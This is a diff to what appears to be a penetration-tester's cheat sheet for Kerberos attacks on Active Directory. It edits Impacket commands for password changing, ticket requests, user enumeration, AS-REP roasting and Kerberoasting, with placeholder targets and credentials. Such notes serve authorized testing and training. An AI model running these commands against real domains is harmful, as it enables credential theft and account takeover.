@@ -280,8 +280,6 @@ use
 [*] Kerberos
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
 
-impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -dc-ip $TARGET -newpass 'Password12345!'
-
 KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
 [libdefaults]
     default_realm = $KRB5DOM
@@ -303,11 +301,13 @@ TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?
 
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
-impacket-GetADUsers $DOM/ -dc-host $DC -k -no-pass
-impacket-GetNPUsers $DOM/ -dc-ip "$TARGET" -usersfile usernames
-while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
+impacket-changepasswd $DOM/ -dc-ip $TARGET -k -no-pass
+impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!' -dc-ip $TARGET
+impacket-GetADUsers $DOM/ -dc-ip $TARGET -k -no-pass
+impacket-GetNPUsers $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
 impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
 impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -request
+while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 
 [*] RDP
